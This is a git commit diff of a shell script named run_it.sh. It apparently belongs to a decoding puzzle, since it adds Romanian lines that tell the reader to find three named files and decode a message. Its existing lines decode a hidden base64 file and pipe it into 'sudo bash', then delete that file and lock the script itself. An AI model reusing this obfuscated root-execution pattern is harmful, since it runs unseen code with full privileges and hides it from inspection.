65220e867b3f9911fb486d316f13179d9c62ad6b
Your Name <you@example.com>
2022-04-04 23:42:18 +0300

    aaa

--- run_it.sh
+++ run_it.sh
@@ -1,3 +1,7 @@
 cat .hidden_script.sh | base64 --decode | sudo bash
 rm .hidden_script.sh
 chmod 000 $0
+echo "cauta urmatoarele fisiere si decodeaza mesajul: " 
+echo "2021_file.config"
+echo "vboxvideo_drv_112"
+echo "apttest"
